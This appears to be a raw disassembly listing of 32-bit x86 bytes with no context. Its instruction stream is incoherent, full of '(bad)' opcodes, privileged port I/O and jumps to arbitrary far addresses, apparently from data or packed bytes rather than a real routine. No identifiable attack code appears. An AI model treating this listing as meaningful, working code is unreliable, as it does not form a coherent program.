  40a06a:	sbb    edx,ecx
  40a06c:	in     eax,dx
  40a06d:	scas   eax,DWORD PTR es:[edi]
  40a06e:	push   ds
  40a06f:	jecxz  0x40a0d5
  40a071:	lock jle 0x40a017
  40a074:	aas    
  40a075:	sbb    ch,BYTE PTR [ecx+0x21]
  40a078:	test   DWORD PTR [edi+0x1b],0xac51b8d7
  40a07f:	pop    es
  40a080:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a081:	hlt    
  40a082:	xor    eax,0x9805ad7a
  40a087:	jmp    0x31b1:0x3bb111a7
  40a08e:	xchg   ebx,eax
  40a08f:	adc    al,0xdb
  40a091:	ins    DWORD PTR es:[edi],dx
  40a092:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a093:	imul   ecx,DWORD PTR [edx+0x604e844a],0xffffffc4
  40a09a:	leave  
  40a09b:	jbe    0x40a02f
  40a09d:	adc    ecx,edi
  40a09f:	addr16 mov ah,0x5
  40a0a2:	mov    eax,ds:0x121fa0ca
  40a0a7:	push   ecx
  40a0a8:	scas   al,BYTE PTR es:[edi]
  40a0a9:	out    0x58,al
  40a0ab:	mov    al,0xa1
  40a0ad:	sub    BYTE PTR [esi+0x7ad42c2e],0xaf
  40a0b4:	sub    ebx,edx
  40a0b6:	mov    edi,0xea96a0e4
  40a0bb:	push   ebp
  40a0bc:	sub    BYTE PTR [ebx-0x13403744],0xb0
  40a0c3:	push   ss
  40a0c4:	das    
  40a0c5:	stos   BYTE PTR es:[edi],al
  40a0c6:	sub    al,0xe5
  40a0c8:	xlat   BYTE PTR ds:[ebx]
  40a0c9:	ins    BYTE PTR es:[edi],dx
  40a0ca:	mov    edi,DWORD PTR [edx+0x128b0b82]
  40a0d0:	loopne 0x40a067
  40a0d2:	ret    0x53ca
  40a0d5:	ins    BYTE PTR es:[edi],dx
  40a0d6:	add    DWORD PTR ds:0x9150f2a5,esp
  40a0dc:	retf   
  40a0dd:	pop    eax
  40a0de:	fwait
  40a0df:	sbb    al,0xda
  40a0e1:	test   eax,0x11e3c1b0
  40a0e6:	sbb    esp,ecx
  40a0e8:	and    eax,0xcba0b581
  40a0ed:	in     al,0x45
  40a0ef:	jge    0x40a0e9
  40a0f1:	sbb    bh,BYTE PTR [ecx-0x73]
  40a0f4:	sti    
  40a0f5:	sbb    al,0x42
  40a0f7:	push   es
  40a0f8:	cmp    ebp,ecx
  40a0fa:	mov    esi,0x8eeda372
  40a0ff:	addr16 std 
  40a101:	mov    esp,0x54465c4e
  40a106:	sar    BYTE PTR [ebx+esi*2+0x28028c58],1
  40a10d:	jae    0x40a149
  40a10f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a110:	or     DWORD PTR [eax-0x6b3680d6],edx
  40a116:	ds pop ds
  40a118:	inc    esi
  40a119:	mov    esp,DWORD PTR [bx-0x69]
  40a11d:	jnp    0x40a198
  40a11f:	scas   al,BYTE PTR es:[edi]
  40a120:	adc    al,0xf8
  40a122:	cmp    ebx,0x159de100
  40a128:	xchg   esp,eax
  40a129:	out    dx,eax
  40a12a:	dec    ecx
  40a12b:	cmp    edi,DWORD PTR [eax]
  40a12d:	fnstcw WORD PTR [eax]
  40a12f:	pushf  
  40a130:	xor    dh,BYTE PTR [ebx+edi*2-0x32]
  40a134:	and    BYTE PTR [ebx+0x57],dh
  40a137:	mov    ebp,0x8c0ea753
  40a13c:	ins    BYTE PTR es:[edi],dx
  40a13d:	adc    eax,DWORD PTR [ebx+0x60e732ae]
  40a143:	popa   
  40a144:	ficom  DWORD PTR [ecx]
  40a146:	or     dl,cl
  40a148:	add    eax,DWORD PTR ds:0x644fba84
  40a14e:	sbb    esi,DWORD PTR [esi]
  40a150:	scas   al,BYTE PTR es:[edi]
  40a151:	pushf  
  40a152:	and    esi,DWORD PTR [ebp+edx*8+0x7f]
  40a156:	icebp  
  40a157:	js     0x40a1ac
  40a159:	mov    bl,0x28
  40a15b:	frstor [esi]
  40a15d:	in     al,0x17
  40a15f:	mov    al,0x46
  40a161:	jmp    0x40a10f
  40a163:	imul   edx,esp,0x424e28a8
  40a169:	push   cs
  40a16a:	cli    
  40a16b:	test   al,0x47
  40a16d:	fld    DWORD PTR [eax]
  40a16f:	je     0x40a170
  40a171:	ds add dl,bl
  40a174:	jmp    0x40a136
  40a176:	inc    ebp
  40a177:	jno    0x40a10a
  40a179:	pop    ebx
  40a17a:	sbb    al,0xc0
  40a17c:	test   al,0x22
  40a17e:	aas    
  40a17f:	(bad)  
  40a180:	lahf   
  40a181:	imul   esi,DWORD PTR [ecx],0x90a3efd9
  40a187:	pop    ebx
  40a188:	fist   DWORD PTR [edx]
  40a18a:	and    DWORD PTR [ebp+0x42],esi
  40a18d:	pop    ecx
  40a18e:	and    eax,eax
  40a190:	adc    BYTE PTR [esi],ah
  40a192:	mov    eax,0x4cb841ae
  40a197:	mov    ah,0xc4
  40a199:	mov    ds:0xd1f9f392,eax
  40a19e:	scas   eax,DWORD PTR es:[edi]
  40a19f:	(bad)  
  40a1a0:	sub    dl,BYTE PTR [eax+0x17]
  40a1a3:	mov    edx,0x71f3ee06
  40a1a8:	jnp    0x40a169
  40a1aa:	cli    
  40a1ab:	mov    esp,0x79cba78b
  40a1b0:	xchg   edi,eax
  40a1b1:	push   es
  40a1b2:	fcomp  DWORD PTR [ebp-0x71]
  40a1b5:	pusha  
  40a1b6:	sub    ah,BYTE PTR [esi-0x15e8ee6a]
  40a1bc:	call   0x4801f237
  40a1c1:	or     ah,BYTE PTR [eax+0x396db0d8]
  40a1c7:	xchg   edx,eax
  40a1c8:	dec    ebx
  40a1c9:	test   al,0x99
  40a1cb:	je     0x40a152
  40a1cd:	push   0x985405b3
  40a1d2:	and    al,0xe1
  40a1d4:	enter  0x7aea,0x19
  40a1d8:	add    cl,BYTE PTR [ebx+0x74d4031]
  40a1de:	bound  ecx,QWORD PTR [eax]
  40a1e0:	lea    ebx,[ecx-0x205494b]
  40a1e6:	enter  0x6ad8,0x27
  40a1ea:	stos   BYTE PTR es:[edi],al
  40a1eb:	dec    eax
  40a1ec:	dec    ecx
  40a1ed:	mov    esi,0xd55a32fb
  40a1f2:	popa   
  40a1f3:	xor    ah,BYTE PTR [edx]
  40a1f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1f6:	or     BYTE PTR [ebx+0x5728a65c],bl
  40a1fc:	cmp    al,0x98
  40a1fe:	dec    ecx
  40a1ff:	scas   eax,DWORD PTR es:[edi]
  40a200:	pop    edi
  40a201:	mov    ebx,0xd811bdc0
  40a206:	into   
  40a207:	dec    edi
  40a208:	in     al,0x3b
  40a20a:	rcr    DWORD PTR [edx],0x1
  40a20d:	in     eax,dx
  40a20e:	loope  0x40a1b9
  40a210:	push   edx
  40a211:	inc    BYTE PTR [esi]
  40a213:	push   0x40
  40a215:	push   esp
  40a216:	sub    BYTE PTR [ecx+ecx*8-0x7],bl
  40a21a:	inc    eax
  40a21b:	jnp    0x40a1a5
  40a21d:	xchg   edx,eax
  40a21e:	ret    0x54f7
  40a221:	sub    ebx,ebp
  40a223:	sub    eax,0x9ac5de5a
  40a228:	imul   DWORD PTR [edx+eax*2]
  40a22b:	pusha  
  40a22c:	mov    bl,0x62
  40a22e:	pop    eax
  40a22f:	xchg   edx,eax
  40a230:	das    
  40a231:	in     eax,0xe9
  40a233:	popf   
  40a234:	add    esi,DWORD PTR [eax+0x42b4209f]
  40a23a:	mov    BYTE PTR [eax-0x1],ah
  40a23d:	inc    ebx
  40a23e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a23f:	sub    ah,BYTE PTR [ebp+0x26e547d8]
  40a245:	jg     0x40a252
  40a247:	sub    BYTE PTR [edi+0xa],al
  40a24a:	jne    0x40a228
  40a24c:	mov    eax,0x28fbdb6e
  40a251:	xchg   ecx,eax
  40a252:	es and eax,0x3be93c42
  40a258:	mov    ebp,0xee590b5c
  40a25d:	jo     0x40a1f3
  40a25f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a260:	retf   
  40a261:	add    al,0x5a
  40a263:	xchg   edx,eax
  40a264:	or     eax,0x46f5f49e
  40a269:	into   
  40a26a:	xor    esi,esp
  40a26c:	pop    ds
  40a26d:	mov    edx,esp
  40a26f:	jmp    0xdaf:0x7a521eca
  40a276:	or     al,0xa2
  40a278:	sub    ah,BYTE PTR [edi]
  40a27a:	test   BYTE PTR [edi],0x68
  40a27d:	stc    
  40a27e:	dec    ebp
  40a27f:	add    DWORD PTR [eax],ebx
  40a281:	xchg   esp,eax
  40a282:	lods   al,BYTE PTR ds:[esi]
  40a283:	sar    bh,1
  40a285:	xchg   BYTE PTR [ecx+0xf],ch
  40a288:	hlt    
  40a289:	(bad)  
  40a28a:	fxch   st(6)
  40a28c:	ins    BYTE PTR es:[edi],dx
  40a28d:	jo     0x40a2b2
  40a28f:	fldenv [eax-0x39cc9edf]
  40a295:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a296:	call   0x142181dd
  40a29b:	imul   esp,DWORD PTR [ecx-0x3995ebcf],0xf70dee16
  40a2a5:	and    BYTE PTR [eax],0x5b
  40a2a8:	dec    edx
  40a2a9:	aas    
  40a2aa:	test   eax,0xcc99ac8d
  40a2af:	jnp    0x40a299
  40a2b1:	mov    esi,0xf06db2f3
  40a2b6:	retf   0x98ea
  40a2b9:	test   DWORD PTR [ecx+esi*1+0x13db6315],0x6cdde8d0
  40a2c4:	aas    
  40a2c5:	mov    dl,0x56
  40a2c7:	cmp    al,0x73
  40a2c9:	sbb    DWORD PTR [ebx-0x31a8570e],ebx
  40a2cf:	pop    ebp
  40a2d0:	dec    esp
  40a2d1:	push   edi
  40a2d2:	icebp  
  40a2d3:	inc    edi
  40a2d4:	or     al,0x4
  40a2d6:	out    0x32,eax
  40a2d8:	cmc    
  40a2d9:	dec    edi
  40a2da:	sar    BYTE PTR [ebx],0x91
  40a2dd:	push   eax
  40a2de:	add    BYTE PTR [ebp-0x379def9e],0x67
  40a2e5:	add    eax,0x85c3b2c7
  40a2ea:	adc    esp,DWORD PTR [edx-0x40]
  40a2ed:	mov    bl,0x4f
  40a2ef:	pop    edi
  40a2f0:	test   BYTE PTR [ecx+0x525d9a4b],cl
  40a2f6:	sub    ah,0x62
  40a2f9:	popf   
  40a2fa:	retf   
  40a2fb:	cmp    al,0x7c
  40a2fd:	pop    edi
  40a2fe:	stos   DWORD PTR es:[edi],eax
  40a2ff:	scas   eax,DWORD PTR es:[edi]
  40a300:	rol    BYTE PTR [edi+0x5a],cl
  40a303:	mov    ch,0xb0
  40a305:	adc    DWORD PTR [eax-0x68408589],ecx
  40a30b:	fwait
  40a30c:	jp     0x40a2ec
  40a30e:	sbb    eax,0x62e3df53
  40a313:	je     0x40a30f
  40a315:	cdq    
  40a316:	(bad)  
  40a319:	pop    ecx
  40a31a:	or     al,BYTE PTR [ebp+eax*4+0x7d]
  40a31e:	sub    al,0x1c
  40a320:	mov    eax,DWORD PTR [eax+0x7a]
  40a323:	jp     0x40a317
  40a325:	pop    edx
  40a326:	loop   0x40a2ca
  40a328:	jbe    0x40a2ab
  40a32a:	imul   edi,DWORD PTR [ecx-0x411afcdc],0xffffff97
  40a331:	sbb    eax,0x456edade
  40a336:	fcmovb st,st(5)
  40a338:	lods   eax,DWORD PTR ds:[esi]
  40a339:	xchg   ebp,eax
  40a33a:	mov    ch,0xd0
  40a33c:	or     DWORD PTR [esi],edx
  40a33e:	inc    esp
  40a33f:	enter  0x495c,0xaa
  40a343:	jno    0x40a392
  40a345:	pop    ecx
  40a346:	outs   dx,BYTE PTR ds:[esi]
  40a347:	fsub   DWORD PTR [eax-0x3a00acf6]
  40a34d:	cmp    esp,DWORD PTR [edx-0xff26fca]
  40a353:	lods   al,BYTE PTR ds:[esi]
  40a354:	mov    ah,0x40
  40a356:	add    eax,0x81404dad
  40a35b:	push   edx
  40a35c:	dec    ebp
  40a35d:	push   ds
  40a35e:	or     ebx,DWORD PTR [eax]
  40a360:	pop    ss
  40a361:	cmp    DWORD PTR [edx],ebp
  40a363:	xor    al,0x79
  40a366:	mov    ds:0xcc6cbbe6,al
  40a36b:	mov    ah,0xf4
  40a36d:	push   esi
  40a36e:	or     al,0x48
  40a370:	(bad)  
  40a371:	mov    dh,0x81
  40a373:	scas   al,BYTE PTR es:[edi]
  40a374:	icebp  
  40a375:	popa   
  40a376:	inc    esp
  40a377:	addr16 mov ebp,0x454101a6
  40a37d:	mov    ah,bh
  40a37f:	cmp    eax,0x33a0d27f
  40a385:	es cli 
  40a387:	ds cli 
  40a389:	dec    ebx
  40a38a:	into   
  40a38b:	jne    0x40a358
  40a38d:	icebp  
  40a38e:	mov    bl,0x38
  40a390:	push   ebx
  40a391:	dec    esp
  40a392:	pop    edx
  40a393:	xor    ecx,DWORD PTR [edi+0x76630b3c]
  40a399:	adc    eax,DWORD PTR [edx+ebx*1-0x3b432edb]
  40a3a0:	jns    0x40a418
  40a3a2:	cmp    BYTE PTR ds:0xf3483393,dh
  40a3a8:	pusha  
  40a3a9:	lds    eax,FWORD PTR [edx+0x2e]
  40a3ac:	sub    al,0x6b
  40a3ae:	sbb    esi,DWORD PTR ds:0xb34adb25
  40a3b4:	mov    bh,BYTE PTR [edx+ecx*1+0x17]
  40a3b8:	xchg   edx,eax
  40a3b9:	jns    0x40a364
  40a3bb:	jbe    0x40a3f5
  40a3bd:	nop
  40a3be:	sbb    dh,cl
  40a3c0:	jl     0x40a34b
  40a3c2:	int    0x9b
  40a3c4:	adc    ch,bh
  40a3c6:	and    DWORD PTR [ecx],edi
  40a3c8:	push   es
  40a3c9:	js     0x40a423
  40a3cb:	fidivr WORD PTR [edi+edi*8]
  40a3ce:	xlat   BYTE PTR ds:[ebx]
  40a3cf:	les    sp,DWORD PTR es:[edx+0x11]
  40a3d4:	xchg   esp,eax
  40a3d5:	mov    ds:0x805fd218,al
  40a3da:	or     eax,DWORD PTR [ecx]
  40a3dc:	ror    BYTE PTR ds:0x12da088b,0xbe
  40a3e3:	(bad)  
  40a3e4:	ds mov eax,0xefd541e1
  40a3ea:	mov    bl,0xc3
  40a3ec:	sahf   
  40a3ed:	repnz push ecx
  40a3ef:	je     0x40a443
  40a3f1:	push   0x29
  40a3f3:	and    esp,DWORD PTR [edi]
  40a3f5:	push   es
  40a3f6:	or     al,0xe8
  40a3f8:	xchg   edx,eax
  40a3f9:	cs push ds
  40a3fb:	adc    DWORD PTR [ebp-0x6bb52a40],esp
  40a401:	sahf   
  40a402:	cmp    ecx,DWORD PTR [eax-0xe6a90c7]
  40a408:	push   edi
  40a409:	aaa    
  40a40a:	adc    BYTE PTR [esi+eiz*8],0x72
  40a40e:	je     0x40a396
  40a410:	pop    ebx
  40a411:	outs   dx,BYTE PTR ds:[esi]
  40a412:	mul    DWORD PTR [edx]
  40a414:	mov    ss,WORD PTR cs:[ebp+edi*8+0x5432f636]
  40a41c:	mov    es,WORD PTR [esi+0x50]
  40a41f:	push   es
  40a420:	adc    al,0xc9
  40a422:	popf   
  40a423:	leave  
  40a424:	adc    ch,BYTE PTR [ebp-0x38]
  40a427:	mov    bh,0x95
  40a429:	xor    dh,bl
  40a42b:	aad    0xc0
  40a42d:	inc    edx
  40a42e:	xchg   ebx,eax
  40a42f:	mov    dl,0xb3
  40a431:	cmp    DWORD PTR ds:0x946ca2e1,esp
  40a437:	enter  0xa6d9,0x71
  40a43b:	sbb    ecx,esi
  40a43d:	fdiv   QWORD PTR [eax]
  40a43f:	push   ss
  40a440:	jae    0x40a405
  40a442:	aas    
  40a443:	adc    al,0xbc
  40a445:	enter  0xabad,0x2a
  40a449:	sub    eax,0x4117186e
  40a44e:	mov    ebp,esp
  40a450:	(bad)  
  40a452:	popa   
  40a453:	mov    edx,0xc36aa850
  40a458:	pop    es
  40a459:	jmp    0x40a45c
  40a45b:	cmp    DWORD PTR [eax-0x41a2100b],ebx
  40a461:	jle    0x40a44d
  40a463:	daa    
  40a464:	jo     0x40a463
  40a466:	call   0x1a959d25
  40a46b:	imul   ecx,DWORD PTR [edi+0x38],0x36
  40a46f:	xchg   esp,eax
  40a470:	jg     0x40a404
  40a472:	jo     0x40a468
  40a474:	sub    ah,BYTE PTR [ebx+0x6ae7e247]
  40a47a:	sub    DWORD PTR [edx],ebp
  40a47c:	add    eax,0x9e2a3d62
  40a481:	or     eax,0xa5bfed17
  40a486:	push   es
  40a487:	sbb    BYTE PTR [esi-0x5],ch
  40a48a:	mov    eax,0xa528ecea
  40a48f:	fwait
  40a490:	jmp    0x40a47b
  40a492:	ins    DWORD PTR es:[edi],dx
  40a493:	fcom   QWORD PTR [ecx]
  40a495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a496:	cmp    eax,0x40a0fea8
  40a49b:	arpl   dx,di
  40a49d:	sbb    al,0xe8
  40a49f:	or     eax,0xec956c27
  40a4a4:	mov    ecx,DWORD PTR [edi]
  40a4a6:	loope  0x40a48e
  40a4a8:	mov    eax,ecx
  40a4aa:	jp     0x40a51f
  40a4ac:	adc    eax,0x14fe26a9
  40a4b1:	fistp  WORD PTR [ebx+0x7adbd7d2]
  40a4b7:	je     0x40a4db
  40a4b9:	and    al,0x10
  40a4bb:	inc    eax
  40a4bc:	add    esp,esp
  40a4be:	jmp    DWORD PTR [ecx+0x76]
  40a4c1:	lahf   
  40a4c2:	test   eax,0x3b176f3b
  40a4c7:	leave  
  40a4c8:	imul   DWORD PTR [edx+eax*2+0x7b]
  40a4cc:	scas   al,BYTE PTR es:[edi]
  40a4cd:	int    0x6f
  40a4cf:	not    DWORD PTR ds:0xe41ae4b0
  40a4d5:	xchg   ecx,eax
  40a4d6:	mov    ah,0x2e
  40a4d8:	mov    esp,0xb9388692
  40a4dd:	dec    esi
  40a4de:	(bad)  
  40a4df:	and    DWORD PTR [edi+0x5c],edx
  40a4e2:	int3   
  40a4e3:	iret   
  40a4e4:	inc    ebp
  40a4e5:	std    
  40a4e6:	outs   dx,DWORD PTR ds:[esi]
  40a4e7:	(bad)  
  40a4e8:	push   0x600fb2ab
  40a4ed:	sub    BYTE PTR ds:0xa5351e2d,dh
  40a4f3:	cmp    ecx,0x15
  40a4f6:	pop    ss
  40a4f7:	scas   al,BYTE PTR es:[edi]
  40a4f8:	in     al,dx
  40a4f9:	mov    bl,0x99
  40a4fb:	jp     0x40a518
  40a4fd:	mov    al,ds:0x34109f96
  40a502:	jo     0x4a191219
  40a508:	push   cs
  40a509:	jo     0x40a4a1
  40a50b:	and    eax,0x9babfb60
  40a510:	or     DWORD PTR [eax],0xffffffb2
  40a513:	cmp    DWORD PTR [ebp+0x6045e8c7],edx
  40a519:	pop    ss
  40a51a:	xchg   ecx,eax
  40a51b:	mul    BYTE PTR [edx+0x93ee654]
  40a521:	jmp    0x40a4ac
  40a523:	dec    ebx
  40a524:	into   
  40a525:	iret   
  40a526:	pop    ebx
  40a527:	inc    edx
  40a528:	cmp    edx,edi
  40a52a:	pop    edi
  40a52b:	repnz xor cl,bl
  40a52e:	or     al,0xc3
  40a530:	daa    
  40a531:	sbb    DWORD PTR [ebx],edi
  40a533:	in     al,dx
  40a534:	ins    DWORD PTR es:[edi],dx
  40a535:	mov    edx,0xf1e99e5a
  40a53a:	mov    ecx,0x36f978f
  40a53f:	or     eax,0x667692
  40a544:	ss popf 
  40a546:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a547:	ins    BYTE PTR es:[edi],dx
  40a548:	jno    0x40a4cb
  40a54a:	inc    ebp
  40a54b:	ja     0x40a54c
  40a54d:	sub    eax,0x4ed82e12
  40a552:	sbb    ax,0x1689
  40a556:	call   0x7c71:0x7683d4f9
  40a55d:	and    BYTE PTR [ebp+0x58eb186b],0xdf
  40a564:	(bad)  
  40a566:	adc    BYTE PTR [ecx+ebx*8+0x78327d0a],bh
  40a56d:	xor    esi,DWORD PTR [ebx+0xb]
  40a570:	clc    
  40a571:	jnp    0x40a5ca
  40a573:	lods   al,BYTE PTR ds:[esi]
  40a574:	adc    DWORD PTR [edi-0x3c],ebp
  40a577:	and    BYTE PTR [esi+0x5d],0xbb
  40a57b:	mov    dl,0xf1
  40a57d:	push   esi
  40a57e:	mov    ecx,0xe241d3f7
  40a583:	test   DWORD PTR [edi-0x55],edi
  40a586:	int    0x5d
  40a588:	popf   
  40a589:	cdq    
  40a58a:	icebp  
  40a58b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a58c:	adc    BYTE PTR [ebp+0x2b59777e],ch
  40a592:	mov    ah,0xa2
  40a594:	outs   dx,DWORD PTR ds:[esi]
  40a595:	and    ecx,ebx
  40a597:	ss sbb eax,0xbd51b489
  40a59d:	ja     0x40a5eb
  40a59f:	sub    dl,BYTE PTR [edi-0x78694df1]
  40a5a5:	inc    esi
  40a5a6:	leave  
  40a5a7:	fs mov ebp,0x83a65922
  40a5ad:	ror    esi,1
  40a5af:	mov    ebx,0xa84e28f
  40a5b4:	pop    eax
  40a5b5:	in     al,dx
  40a5b6:	pop    ds
  40a5b7:	arpl   WORD PTR [edx],cx
  40a5b9:	sub    al,0x6e
  40a5bb:	in     al,dx
  40a5bc:	iret   
  40a5bd:	pop    esp
  40a5be:	ss aad 0xb4
  40a5c1:	push   edx
  40a5c2:	hlt    
  40a5c3:	rol    BYTE PTR [edi-0x442d706b],0xe9
  40a5ca:	nop
  40a5cb:	fsubr  DWORD PTR fs:[esi]
  40a5ce:	stc    
  40a5cf:	pop    eax
  40a5d0:	aaa    
  40a5d1:	sbb    eax,eax
  40a5d3:	arpl   bx,di
  40a5d5:	sub    esi,DWORD PTR [edi-0x34]
  40a5d8:	push   edi
  40a5d9:	push   edi
  40a5da:	pop    ds
  40a5db:	stos   DWORD PTR es:[edi],eax
  40a5dc:	mov    WORD PTR [ecx-0x59],?
  40a5df:	lods   eax,DWORD PTR ds:[esi]
  40a5e0:	mov    dh,0x29
  40a5e2:	rcr    BYTE PTR [edx],1
  40a5e4:	frstor [ebx-0x356b8f08]
  40a5ea:	xor    al,0x7b
  40a5ec:	add    esp,ebx
  40a5ee:	imul   esi,esp,0x22e38d01
  40a5f4:	mov    al,ds:0x472d0b18
  40a5f9:	fcomp  DWORD PTR [esi-0x15dc7deb]
  40a5ff:	fdiv   QWORD PTR [eax-0x60e5565]
  40a605:	je     0x40a64c
  40a607:	mov    WORD PTR ds:0x4be49847,cs
  40a60d:	mov    cl,0x9c
  40a60f:	and    eax,ebp
  40a611:	add    eax,edi
  40a613:	fdivr  QWORD PTR [ebp-0x64]
  40a616:	cs js  0x40a5dc
  40a619:	jnp    0x40a60b
  40a61b:	lea    ecx,ds:0x18bddd2b
  40a621:	cmp    DWORD PTR [edx-0x29],ebx
  40a624:	repz into 
  40a626:	repnz dec eax
  40a628:	dec    esi
  40a629:	pop    es
  40a62a:	in     eax,0x90
  40a62c:	inc    ebp
  40a62d:	aad    0x95
  40a62f:	xor    al,0xc8
  40a631:	push   0xc331f6bc
  40a636:	and    al,BYTE PTR [edi]
  40a638:	pop    ds
  40a639:	push   esi
  40a63a:	mov    al,0x37
  40a63c:	mov    ch,0x14
  40a63e:	shl    DWORD PTR [edx-0x13],0xda
  40a642:	icebp  
  40a643:	jge    0x40a628
  40a645:	push   es
  40a646:	sub    esi,DWORD PTR [eax+0x18]
  40a649:	xor    BYTE PTR [ebp+eax*4-0x4c453a0e],ch
  40a650:	std    
  40a651:	xor    esi,DWORD PTR ds:0x97f3fb6
  40a657:	dec    esi
  40a658:	xchg   esi,eax
  40a659:	out    0x75,eax
  40a65b:	inc    ebx
  40a65c:	pop    ecx
  40a65d:	mov    eax,ds:0x9d367c38
  40a662:	xor    DWORD PTR [esi+eax*8+0x4a5104a1],ebp
  40a669:	xchg   BYTE PTR [ebx+0x72],bl
  40a66c:	lea    eax,[esi]
  40a66e:	sub    al,0x6e
  40a670:	in     eax,dx
  40a671:	xor    eax,DWORD PTR [ebp-0x37]
  40a674:	pop    es
  40a675:	cdq    
  40a676:	inc    ebp
  40a677:	push   0x51f8e39b
  40a67c:	sahf   
  40a67d:	retf   
  40a67e:	cmp    BYTE PTR [ebx-0x62],0x25
  40a682:	inc    esi
  40a683:	imul   esp,DWORD PTR [ebp+0x6c],0xffffff9b
  40a687:	cwde   
  40a688:	hlt    
  40a689:	retf   0x1e6
  40a68c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a68d:	(bad)  
  40a68e:	repnz adc BYTE PTR [esp+ebp*2+0x5e843529],al
  40a696:	shr    DWORD PTR ds:0x33e3724d,0x18
  40a69d:	adc    al,0xb9
  40a69f:	cmp    al,BYTE PTR [esi+0x5eda529]
  40a6a5:	(bad)  
  40a6a6:	loope  0x40a6a0
  40a6a8:	jg     0x40a715
  40a6aa:	dec    edi
  40a6ab:	add    eax,0xbef09946
  40a6b0:	lock ret 0xf25a
  40a6b4:	sub    ecx,DWORD PTR [esi]
  40a6b6:	or     BYTE PTR [ecx+eax*8+0x3cf241ec],dl
  40a6bd:	or     dh,dh
  40a6bf:	or     DWORD PTR [edx],0xae05e761
  40a6c5:	mov    al,ds:0x49261935
  40a6ca:	inc    edi
  40a6cb:	stc    
  40a6cc:	mov    cl,0x9c
  40a6ce:	popa   
  40a6cf:	jns    0x40a72e
  40a6d1:	data16 daa 
  40a6d3:	ret    
  40a6d4:	(bad)  
  40a6d5:	jmp    0x66ec88ae
  40a6da:	xchg   BYTE PTR [ebp-0x55827bc0],ch
  40a6e0:	stos   DWORD PTR es:[edi],eax
  40a6e1:	call   DWORD PTR [edx-0x347ce8c7]
  40a6e7:	out    dx,eax
  40a6e8:	xor    eax,0x2cb240eb
  40a6ed:	lods   al,BYTE PTR ds:[esi]
  40a6ee:	push   es
  40a6ef:	cmp    al,0x13
  40a6f1:	add    al,0xfc
  40a6f3:	stos   BYTE PTR es:[edi],al
  40a6f4:	xchg   ebx,eax
  40a6f5:	add    eax,0x6e4be485
  40a6fa:	retf   0xdbf2
  40a6fd:	dec    edi
  40a6fe:	mov    ebp,0xc2ba4fe3
  40a703:	push   ecx
  40a704:	mov    edx,0xd399ebdf
  40a709:	pop    ds
  40a70a:	jp     0x40a74d
  40a70c:	enter  0xe98f,0x9f
  40a710:	inc    edx
  40a711:	mov    ecx,0x81162e08
  40a716:	or     al,0xbc
  40a718:	ins    DWORD PTR es:[edi],dx
  40a719:	addr16 icebp 
  40a71b:	ds popf 
  40a71d:	sbb    edx,edx
  40a71f:	outs   dx,BYTE PTR ds:[esi]
  40a720:	xchg   ebx,eax
  40a721:	jg     0x40a72d
  40a723:	daa    
  40a724:	clc    
  40a725:	sub    BYTE PTR [eax+ecx*2-0x40e821fb],ch
  40a72c:	mov    al,0x7b
  40a72e:	lahf   
  40a72f:	iret   
  40a730:	fucomi st,st(0)
  40a732:	inc    eax
  40a733:	push   edx
  40a734:	pop    eax
  40a735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a736:	jbe    0x40a70b
  40a738:	cmp    eax,0xae5f3bb
  40a73d:	inc    edx
  40a73e:	inc    ecx
  40a73f:	ror    BYTE PTR [ecx+0x4a],cl
  40a742:	mov    eax,DWORD PTR [edx+0x5bcea871]
  40a748:	fwait
  40a749:	inc    eax
  40a74a:	aas    
  40a74b:	jle    0x40a6ec
  40a74d:	sbb    dl,bh
  40a74f:	and    al,0x19
  40a751:	int3   
  40a752:	les    esp,FWORD PTR [ecx-0x36e69d31]
  40a758:	xchg   ebx,eax
  40a759:	int3   
  40a75a:	out    dx,al
  40a75b:	std    
  40a75c:	retf   
  40a75d:	test   BYTE PTR [ecx],cl
  40a75f:	leave  
  40a760:	jp     0x40a7dc
  40a762:	in     al,dx
  40a763:	(bad)  
  40a764:	jnp    0x40a721
  40a766:	pop    ds
  40a767:	dec    eax
  40a768:	jmp    0x40a7b2
  40a76a:	jne    0x40a7b9
  40a76c:	jmp    0x550c:0xe6927750
  40a773:	bound  edi,QWORD PTR [esp+ebp*4]
  40a776:	aas    
  40a777:	mov    esp,0xa23d69bf
  40a77c:	adc    edx,esp
  40a77e:	jle    0x40a730
  40a780:	jbe    0x40a7f6
  40a782:	gs cmp ebp,esp
  40a785:	mov    al,0xb8
  40a787:	stos   BYTE PTR es:[edi],al
  40a788:	push   es
  40a789:	push   esp
  40a78a:	aas    
  40a78b:	daa    
  40a78c:	sub    bh,BYTE PTR [edx-0x102c5403]
  40a792:	out    dx,eax
  40a793:	add    DWORD PTR [eax],0xffffffc6
  40a796:	jae    0x40a73d
  40a798:	sbb    al,0xe1
  40a79a:	mov    eax,0x89bc0eb
  40a79f:	xor    esp,DWORD PTR [ecx+eiz*8+0x78]
  40a7a3:	gs sbb eax,ebp
  40a7a6:	push   ebp
  40a7a7:	jp     0x40a78a
  40a7a9:	stc    
  40a7aa:	push   edi
  40a7ab:	push   ds
  40a7ac:	aad    0x4a
  40a7ae:	icebp  
  40a7af:	xor    ebp,DWORD PTR [esi]
  40a7b1:	shl    BYTE PTR [ecx+0x3c],1
  40a7b4:	mov    bh,0x9a
  40a7b6:	(bad)
  40a7b9:	mov    cl,0x45
  40a7bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7bc:	jno    0x72da
  40a7c1:	push   ebx
  40a7c2:	(bad)  
  40a7c3:	adc    BYTE PTR [eax+0x1d],al
  40a7c6:	jmp    0x20eec452
  40a7cb:	stos   BYTE PTR es:[edi],al
  40a7cc:	fist   WORD PTR ds:[ebx+edx*8-0x3ab99fe6]
  40a7d4:	pop    edi
  40a7d5:	mov    bl,0x65
  40a7d7:	mov    eax,ds:0xb229d5fa
  40a7dc:	pop    ebp
  40a7dd:	repnz xchg ebx,eax
  40a7df:	add    esi,esi
